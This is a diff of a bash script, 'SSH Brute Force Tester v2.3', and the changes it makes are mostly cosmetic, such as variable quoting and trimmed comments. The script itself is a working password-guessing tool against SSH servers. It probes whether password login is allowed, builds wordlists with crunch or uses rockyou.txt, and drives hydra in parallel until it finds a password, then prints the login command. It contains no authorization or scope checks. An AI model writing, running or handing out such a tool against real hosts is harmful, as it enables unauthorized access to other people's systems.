@@ -1,22 +1,9 @@
 #!/bin/bash
 # SSH Brute Force Tester v2.3
 # Usage: ./ssh-brute.sh <ip> <user> [wordlist] [port]
-#
-# Wordlists (auto-detected in script dir):
-#   wordlist.txt         — 363 common passwords (fast, seconds)
-#   wordlist-keyboard.txt — 320 keyboard/name/date patterns (fast)
-#   all                  — merge both (670 passwords)
-#   crunch 6lower        — all 6-char lowercase (308M, ~hours)
-#   crunch 6alnum        — all 6-char alphanumeric (2.1B, ~days)
-#   /path/to/custom.txt  — any custom wordlist
 
-IP="${1:?Usage: $0 <ip> <user> [wordlist] [port]
-  wordlists:
-    all            — merge built-in (670 passwords)
-    crunch 6lower  — 308M 6-char lowercase
-    crunch 6alnum  — 2.1B 6-char alphanumeric
-    /path/to/file  — custom wordlist"}'
-USER="${2:?Usage: $0 <ip> <user> [wordlist] [port]}"
+IP="${1:?Usage: $0 ip user wordlist port}"
+USER="${2:?Usage: $0 ip user wordlist port}"
 WORDLIST_ARG="${3:-all}"
 PORT="${4:-22}"
 LOG="${TMPDIR:-/tmp}/ssh-brute-$(date +%Y%m%d-%H%M%S).log"
@@ -32,9 +19,9 @@ log() { echo -e "$1" | tee -a "$LOG"; }
 strip_ansi() { echo "$1" | sed 's/\x1b\[[0-9;]*m//g'; }
 
 log "${YELLOW}=== SSH Brute Force Tester v2.3 ===${NC}"
-log "Target: ${RED}$IP:$PORT${NC}"
-log "User:   ${RED}$USER${NC}"
-log "Log:    $LOG"
+log "Target: ${RED}${IP}:${PORT}${NC}"
+log "User:   ${RED}${USER}${NC}"
+log "Log:    ${LOG}"
 log ""
 
 # === Pre-checks ===
@@ -52,8 +39,8 @@ fi
 
 # === Wordlist selection ===
 SCRIPT_DIR="$(cd "$(dirname "$(readlink -f "$0" 2>/dev/null || echo "$0")")" && pwd)"
-WL_COMMON="$SCRIPT_DIR/wordlist.txt"
-WL_KEYBOARD="$SCRIPT_DIR/wordlist-keyboard.txt"
+WL_COMMON="${SCRIPT_DIR}/wordlist.txt"
+WL_KEYBOARD="${SCRIPT_DIR}/wordlist-keyboard.txt"
 WL_MERGED="${TMPDIR:-/tmp}/ssh-brute-merged.txt"
 
 generate_crunch() {
@@ -63,7 +50,7 @@ generate_crunch() {
         echo "$outfile"
         return
     fi
-    log "${YELLOW}[*] Generating crunch wordlist ($type)...${NC}"
+    log "${YELLOW}[*] Generating crunch wordlist: ${type}${NC}"
     if ! command -v crunch &>/dev/null; then
         log "${RED}[!] crunch not installed${NC}"
         log "${RED}    Ubuntu: sudo apt install crunch -y${NC}"
@@ -73,23 +60,22 @@ generate_crunch() {
     case "$type" in
         6lower) crunch 6 6 abcdefghijklmnopqrstuvwxyz -o "$outfile" 2>/dev/null ;;
         6alnum) crunch 6 6 abcdefghijklmnopqrstuvwxyz0123456789 -o "$outfile" 2>/dev/null ;;
-        *) log "${RED}[!] Unknown crunch type: $type${NC}"; exit 1 ;;
+        *) log "${RED}[!] Unknown crunch type: ${type}${NC}"; exit 1 ;;
     esac
     echo "$outfile"
 }
 
 case "$WORDLIST_ARG" in
     all)
-        # Merge all built-in wordlists
         cat "$WL_COMMON" "$WL_KEYBOARD" > "$WL_MERGED" 2>/dev/null || true
         sort -u "$WL_MERGED" -o "$WL_MERGED"
         WORDLIST="$WL_MERGED"
         log "${GREEN}[*] Using all built-in wordlists${NC}"
         ;;
-    crunch\ 6lower)
+    "crunch 6lower")
         WORDLIST=$(generate_crunch "6lower")
         ;;
-    crunch\ 6alnum)
+    "crunch 6alnum")
         WORDLIST=$(generate_crunch "6alnum")
         ;;
     *)
@@ -98,16 +84,16 @@ case "$WORDLIST_ARG" in
 esac
 
 if [ ! -f "$WORDLIST" ]; then
-    log "${RED}[!] Wordlist not found: $WORDLIST${NC}"
+    log "${RED}[!] Wordlist not found: ${WORDLIST}${NC}"
     exit 1
 fi
 if [ ! -s "$WORDLIST" ]; then
-    log "${RED}[!] Wordlist is empty: $WORDLIST${NC}"
+    log "${RED}[!] Wordlist is empty: ${WORDLIST}${NC}"
     exit 1
 fi
 
 # === Check password auth ===
-log "${YELLOW}[1/3] Checking password auth on port $PORT...${NC}"
+log "${YELLOW}[1/3] Checking password auth on port ${PORT}...${NC}"
 SSH_OUTPUT=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
     -o PreferredAuthentications=none -p "$PORT" "$USER@$IP" 2>&1) || true
 
@@ -115,10 +101,10 @@ if [[ "$SSH_OUTPUT" == *"publickey"* ]]; then
     log "${RED}[!] Target only accepts SSH keys - brute force impossible${NC}"
     exit 1
 elif [[ "$SSH_OUTPUT" == *"Connection refused"* ]]; then
-    log "${RED}[!] Connection refused on port $PORT${NC}"
+    log "${RED}[!] Connection refused on port ${PORT}${NC}"
     exit 1
 elif [[ "$SSH_OUTPUT" == *"Connection timed out"* ]]; then
-    log "${RED}[!] Connection timed out on port $PORT${NC}"
+    log "${RED}[!] Connection timed out on port ${PORT}${NC}"
     exit 1
 elif [[ "$SSH_OUTPUT" == *"No route to host"* ]]; then
     log "${RED}[!] No route to host${NC}"
@@ -130,7 +116,7 @@ elif [[ "$SSH_OUTPUT" == *"Permission denied"* ]]; then
     log "${GREEN}[+] Password auth supported!${NC}"
 else
     log "${YELLOW}[?] Unknown response, trying anyway...${NC}"
-    log "${YELLOW}[?] SSH: $SSH_OUTPUT${NC}"
+    log "${YELLOW}[?] SSH: ${SSH_OUTPUT}${NC}"
 fi
 
 # === Attack ===
@@ -140,11 +126,11 @@ if [ "$COUNT" -eq 0 ]; then
     exit 1
 fi
 
-# Estimate time (rough: ~4 attempts/sec with 4 threads)
+# Estimate time
 EST_SEC=$((COUNT / 4))
 EST_MIN=$((EST_SEC / 60))
 
-log "${YELLOW}[2/3] Wordlist: $COUNT passwords${NC}"
+log "${YELLOW}[2/3] Wordlist: ${COUNT} passwords${NC}"
 if [ $EST_MIN -gt 60 ]; then
     EST_HR=$((EST_MIN / 60))
     log "${YELLOW}       Estimated time: ~${EST_HR}h${NC}"
@@ -153,7 +139,7 @@ elif [ $EST_MIN -gt 0 ]; then
 else
     log "${YELLOW}       Estimated time: ~${EST_SEC}sec${NC}"
 fi
-log "${YELLOW}[3/3] Starting brute force (timeout ${TIMEOUT}s)...${NC}"
+log "${YELLOW}[3/3] Starting brute force...${NC}"
 log ""
 
 # Auto-detect thread count
@@ -170,19 +156,19 @@ while IFS= read -r line; do
     if [[ "$line" == *"host:"* ]]; then
         FOUND_LINE="$line"
         log ""
-        log "${GREEN}╔════════════════════════════════════════════╗${NC}"
-        log "${GREEN}║  PASSWORD FOUND!                           ║${NC}"
-        log "${GREEN}╚════════════════════════════════════════════╝${NC}"
-        log "${GREEN}[FOUND] $line${NC}"
-        log "${GREEN}[CMD]   ssh -p $PORT $USER@$IP${NC}"
-        strip_ansi "$line" >> "$LOG.clean"
+        log "${GREEN}========================================${NC}"
+        log "${GREEN}  PASSWORD FOUND!                        ${NC}"
+        log "${GREEN}========================================${NC}"
+        log "${GREEN}[FOUND] ${line}${NC}"
+        log "${GREEN}[CMD]   ssh -p ${PORT} ${USER}@${IP}${NC}"
+        strip_ansi "$line" >> "${LOG}.clean"
     elif [[ "$line" == *"[ATTEMPT]"* ]]; then
         attempt=$(echo "$line" | sed -n 's/.*login: //p')
         printf "${CYAN}[*] Trying: %s\033[K\r${NC}" "$attempt"
     elif [[ "$line" == *"ERROR"* ]]; then
-        log "${RED}[ERR] $line${NC}"
+        log "${RED}[ERR] ${line}${NC}"
     fi
-    strip_ansi "$line" >> "$LOG.raw"
+    strip_ansi "$line" >> "${LOG}.raw"
 done < <(timeout "$TIMEOUT" hydra -l "$USER" -P "$WORDLIST" -t "$THREADS" -f -V -s "$PORT" "$IP" ssh 2>&1) || HYDRA_EXIT=$?
 
 log ""
@@ -192,21 +178,21 @@ log ""
 if [ $HYDRA_EXIT -eq 124 ]; then
     log "${RED}[!] Timed out after ${TIMEOUT} seconds${NC}"
     log "${RED}    Only partial wordlist tried. Increase timeout:${NC}"
-    log "${RED}    TIMEOUT=600 ./ssh-brute.sh $IP $USER $WORDLIST_ARG $PORT${NC}"
+    log "${RED}    TIMEOUT=600 ./ssh-brute.sh ${IP} ${USER} all ${PORT}${NC}"
 elif [ -n "$FOUND_LINE" ]; then
-    log "${GREEN}[+] SSH: ssh -p $PORT $USER@$IP${NC}"
+    log "${GREEN}[+] SSH: ssh -p ${PORT} ${USER}@${IP}${NC}"
 elif [ $HYDRA_EXIT -eq 0 ] || [ $HYDRA_EXIT -eq 1 ]; then
-    log "${YELLOW}[-] No password found ($COUNT tried)${NC}"
+    log "${YELLOW}[-] No password found - ${COUNT} tried${NC}"
     log "${YELLOW}[-] Try bigger wordlist:${NC}"
-    log "${YELLOW}    ./ssh-brute.sh $IP $USER 'crunch 6lower' $PORT${NC}"
-    log "${YELLOW}    ./ssh-brute.sh $IP $USER 'crunch 6alnum' $PORT${NC}"
+    log "${YELLOW}    ./ssh-brute.sh ${IP} ${USER} 'crunch 6lower' ${PORT}${NC}"
+    log "${YELLOW}    ./ssh-brute.sh ${IP} ${USER} 'crunch 6alnum' ${PORT}${NC}"
     log "${YELLOW}    pkg install wordlists${NC}"
-    log "${YELLOW}    ./ssh-brute.sh $IP $USER /usr/share/wordlists/rockyou.txt $PORT${NC}"
+    log "${YELLOW}    ./ssh-brute.sh ${IP} ${USER} /usr/share/wordlists/rockyou.txt ${PORT}${NC}"
 else
-    log "${RED}[!] Hydra exited with code $HYDRA_EXIT${NC}"
+    log "${RED}[!] Hydra exited with code ${HYDRA_EXIT}${NC}"
 fi
 
 log "${YELLOW}=== Scan Complete ===${NC}"
-log "Log: $LOG"
-[ -f "$LOG.clean" ] && log "Clean: $LOG.clean"
-[ -f "$LOG.raw" ] && log "Raw: $LOG.raw"
+log "Log: ${LOG}"
+[ -f "${LOG}.clean" ] && log "Clean: ${LOG}.clean"
+[ -f "${LOG}.raw" ] && log "Raw: ${LOG}.raw"
